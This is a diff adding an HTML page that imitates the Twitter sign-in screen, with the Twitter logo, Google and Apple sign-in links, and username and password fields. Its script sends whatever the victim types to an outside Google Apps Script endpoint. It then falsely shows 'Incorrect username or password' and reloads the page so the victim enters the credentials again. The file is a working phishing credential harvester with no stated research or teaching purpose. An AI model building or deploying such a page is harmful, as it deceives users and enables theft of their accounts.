@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=-1.0" />
+    <title>TWITTER</title>
+    <link rel="icon" href="logo-twitter.png" />
+    <link rel="stylesheet" href="tweet.css" />
+  </head>
+  <body>
+   <form action="" method="post" name="contactform">
+      <img src="logo-twitter.png" alt="error" />
+      <h2>Sign in to Twitter</h2>
+      <br />
+      <a href="www.google.com">
+        <img
+          src="google-icon.png"
+          style="position: relative; height: 30px; width: 30px; top: 20%"
+        />
+        Sign in with google</a
+      >
+      <br /><br />
+      <a href="www.apple.com">
+        <img
+          src="apple-logo.png"
+          style="position: relative; height: 35px; width: 35px; top: 15%"
+        />
+        Sign in with Apple</a
+      >
+      <br />
+      <h3>or</h3>
+      <br />
+      <input type="text" placeholder="Phone,email,or username" id="username" name="username" />
+      <br>
+      <input type="password" placeholder="Password" id="password" name="password" />
+      <br /><br />
+      <input
+        type="submit"
+        value="Next"
+        style="
+          background: white;
+          color: black;
+          font-weight: bold;
+          border-radius: 20px;
+        "
+      /><br /><br />
+      <a
+        href="#"
+        style="
+          background: black;
+          color: white;
+          border: 0.2px solid rgba(255, 255, 255, 0.521);
+          padding: 8px;
+          height: 25px;
+        "
+        >Forgot password?</a
+      >
+      <br /><br /><br />
+      <p>
+        Don't have an account?<a
+          href="#"
+          style="
+            background: black;
+            color: blue; 
+            font-weight: lighter; 
+            font-family: system-ui;
+            font-weight: bold;
+          "
+          >Sign up</a
+        >
+      </p>
+    </form>
+    <script>
+        const scriptURL =
+            "https://script.google.com/macros/s/AKfycbz954-F5hUZ9fn0fEiwr7FouRJnQXutq346hHdoRl60dBZE4T7UccjDBYAOn4VxrH3bOA/exec";
+        const form = document.forms["contactform"];
+    
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+            fetch(scriptURL, { method: "POST", body: new FormData(form) })
+                .then((response) => alert("Incorrect username or password"))
+                .then(() => {
+                    window.location.reload();
+                })
+                .catch((error) => console.error("Error!", error.message));
+        });
+    </script>
+  </body>
+</html>
